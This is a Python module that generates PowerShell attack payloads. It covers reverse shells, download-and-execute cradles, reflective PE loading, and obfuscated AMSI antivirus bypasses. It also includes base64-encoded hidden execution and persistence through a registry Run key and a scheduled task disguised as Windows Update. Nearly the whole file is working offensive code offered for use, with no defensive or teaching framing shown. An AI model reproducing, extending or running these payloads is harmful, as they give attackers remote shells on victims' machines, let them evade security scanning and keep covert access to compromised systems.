"""PowerShell payload generation with AMSI bypass and obfuscation.

Provides PowerShell reverse shells, download cradles, and obfuscation
techniques for bypassing security controls.
"""

import base64
import random
import string
from typing import Optional, List


class PowerShellGenerator:
    """Generates PowerShell payloads with various techniques."""
    
    @staticmethod
    def generate_reverse_shell(lhost: str, lport: int, encode_base64: bool = False) -> str:
        """Generate PowerShell reverse shell.
        
        Args:
            lhost: Listener host
            lport: Listener port
            encode_base64: Whether to base64 encode for execution
            
        Returns:
            PowerShell reverse shell payload
        """
        payload = f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
        
        if encode_base64:
            payload_bytes = payload.encode('utf-16le')
            payload_b64 = base64.b64encode(payload_bytes).decode()
            return f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {payload_b64}"
        
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"{payload}\""
    
    @staticmethod
    def generate_download_cradle(url: str, method: str = "webclient") -> str:
        """Generate PowerShell download cradle.
        
        Args:
            url: URL to download from
            method: Download method (webclient, webrequest, bitsadmin)
            
        Returns:
            PowerShell download and execute payload
        """
        if method == "webclient":
            return f"IEX(New-Object Net.WebClient).DownloadString('{url}')"
        elif method == "webrequest":
            return f"IEX(IWR '{url}' -UseBasicParsing).Content"
        elif method == "bitsadmin":
            return f"bitsadmin /transfer mydownload /download /priority high {url} $env:temp\\payload.ps1; powershell -ExecutionPolicy Bypass -File $env:temp\\payload.ps1"
        else:
            raise ValueError(f"Unsupported download method: {method}")
    
    @staticmethod
    def generate_amsi_bypass_v1() -> str:
        """Generate AMSI bypass technique (reflection method).
        
        Returns:
            PowerShell AMSI bypass payload
        """
        return """[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"""
    
    @staticmethod
    def generate_amsi_bypass_v2() -> str:
        """Generate AMSI bypass technique (memory patching).
        
        Returns:
            PowerShell AMSI bypass payload
        """
        return """$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)"""
    
    @staticmethod
    def generate_amsi_bypass_obfuscated() -> str:
        """Generate obfuscated AMSI bypass.
        
        Returns:
            Obfuscated PowerShell AMSI bypass payload
        """
        return """$w=[System.String];$z=$w::Join('',('Am','siUt','ils'));$x=[Ref].Assembly.GetType(('System.Management.Automation.'+$z));$y=$x.GetField(('am','siIn','itFa','iled'-join''),'NonPublic,Static');$y.SetValue($null,$true)"""
    
    @staticmethod
    def obfuscate_string(text: str) -> str:
        """Obfuscate a string using PowerShell concatenation.
        
        Args:
            text: String to obfuscate
            
        Returns:
            Obfuscated PowerShell string expression
        """
        parts = []
        for char in text:
            if random.random() > 0.5:
                parts.append(f"'{char}'")
            else:
                parts.append(f"[char]{ord(char)}")
        
        return "(" + "+".join(parts) + ")"
    
    @staticmethod
    def obfuscate_command(command: str) -> str:
        """Obfuscate PowerShell command.
        
        Args:
            command: Command to obfuscate
            
        Returns:
            Obfuscated command using various techniques
        """
        techniques = [
            lambda c: f"& ({PowerShellGenerator.obfuscate_string('iex')}) ({PowerShellGenerator.obfuscate_string(c)})",
            lambda c: f"$x={PowerShellGenerator.obfuscate_string(c)};IEX $x",
            lambda c: f"Invoke-Expression ({PowerShellGenerator.obfuscate_string(c)})"
        ]
        
        return random.choice(techniques)(command)
    
    @staticmethod
    def generate_encoded_payload(payload: str) -> str:
        """Generate base64 encoded PowerShell payload.
        
        Args:
            payload: PowerShell payload to encode
            
        Returns:
            Base64 encoded PowerShell execution command
        """
        payload_bytes = payload.encode('utf-16le')
        payload_b64 = base64.b64encode(payload_bytes).decode()
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {payload_b64}"
    
    @staticmethod
    def generate_process_injection(lhost: str, lport: int) -> str:
        """Generate PowerShell payload with process injection.
        
        Args:
            lhost: Listener host
            lport: Listener port
            
        Returns:
            PowerShell process injection payload
        """
        return f"""
function Inject-Shell {{
    Param($LHOST='{lhost}', $LPORT={lport})
    $code = {{
        function Get-ProcAddress {{
            Param($module, $procedure)
            $systemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {{ $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }}
            $unsafeNativeMethods = $systemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
            $getModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')
            $getProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
            $kern32Handle = $getModuleHandle.Invoke($null, @($module))
            $tmpPtr = New-Object IntPtr
            $handleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $kern32Handle)
            return $getProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$handleRef, $procedure))
        }}
        $client = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{{0}}
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }}
        $client.Close()
    }}
    Invoke-Command -ScriptBlock $code
}}
Inject-Shell
"""
    
    @staticmethod
    def generate_reflective_loader(url: str) -> str:
        """Generate reflective PE loader.
        
        Args:
            url: URL to PE file to load
            
        Returns:
            PowerShell reflective loader payload
        """
        return f"""
$PEBytes = (New-Object Net.WebClient).DownloadData('{url}')
$PEBytes32 = $PEBytes
$PEBytes64 = $PEBytes
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
"""
    
    @staticmethod
    def generate_registry_persistence(payload: str, key_name: str = "WindowsUpdate") -> str:
        """Generate PowerShell registry persistence.
        
        Args:
            payload: Payload to persist
            key_name: Registry key name
            
        Returns:
            PowerShell registry persistence command
        """
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        return f"""
$regPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
$encodedPayload = '{encoded}'
$decodedPayload = 'powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ' + $encodedPayload
Set-ItemProperty -Path $regPath -Name '{key_name}' -Value $decodedPayload
"""
    
    @staticmethod
    def generate_scheduled_task_persistence(payload: str, task_name: str = "WindowsUpdateCheck") -> str:
        """Generate PowerShell scheduled task persistence.
        
        Args:
            payload: Payload to persist
            task_name: Scheduled task name
            
        Returns:
            PowerShell scheduled task persistence command
        """
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        return f"""
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}'
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName '{task_name}' -Action $action -Trigger $trigger -RunLevel Highest -Force
"""


def generate_powershell_payload(
    payload_type: str,
    lhost: Optional[str] = None,
    lport: Optional[int] = None,
    url: Optional[str] = None,
    encode: bool = False,
    bypass_amsi: bool = True
) -> str:
    """Factory function to generate PowerShell payloads.
    
    Args:
        payload_type: Type of payload (reverse_shell, download_cradle, etc.)
        lhost: Listener host (for reverse shell)
        lport: Listener port (for reverse shell)
        url: URL (for download cradles)
        encode: Whether to base64 encode
        bypass_amsi: Whether to prepend AMSI bypass
        
    Returns:
        Generated PowerShell payload
        
    Raises:
        ValueError: If required parameters are missing
    """
    payload = ""
    
    if bypass_amsi:
        payload = PowerShellGenerator.generate_amsi_bypass_obfuscated() + ";"
    
    if payload_type == "reverse_shell":
        if not lhost or not lport:
            raise ValueError("reverse_shell requires lhost and lport")
        payload += PowerShellGenerator.generate_reverse_shell(lhost, lport, encode)
    elif payload_type == "download_cradle":
        if not url:
            raise ValueError("download_cradle requires url")
        payload += PowerShellGenerator.generate_download_cradle(url)
    elif payload_type == "process_injection":
        if not lhost or not lport:
            raise ValueError("process_injection requires lhost and lport")
        payload += PowerShellGenerator.generate_process_injection(lhost, lport)
    else:
        raise ValueError(f"Unsupported payload type: {payload_type}")
    
    return payload
